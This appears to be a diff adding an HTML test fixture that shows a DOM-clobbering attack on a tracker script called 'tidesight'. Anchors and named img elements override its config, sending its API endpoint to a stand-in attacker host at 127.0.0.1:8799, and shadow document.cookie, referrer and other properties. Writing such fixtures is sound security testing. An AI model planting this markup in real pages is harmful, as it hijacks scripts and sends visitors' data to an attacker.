@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Clobbered</title>
+</head>
+<body>
+  <h1>User content</h1>
+  <!-- Markup a weak sanitizer let through: it shadows the tracker's globals and document properties
+       (DOM clobbering). 127.0.0.1:8799 stands for the attacker. -->
+  <a id="tidesightConfig"></a><a id="tidesightConfig" name="api" href="http://127.0.0.1:8799/evil">x</a>
+  <a id="tidesight"></a><a id="tidesight" name="q">y</a>
+  <img name="currentScript" src="http://127.0.0.1:8799/img.png" alt="">
+  <img name="cookie" alt=""><img name="referrer" alt=""><img name="title" alt=""><img name="visibilityState" alt="">
+  <a id="rrwebRecord"></a>
+  <script src="/loader.js"></script>
+</body>
+</html>
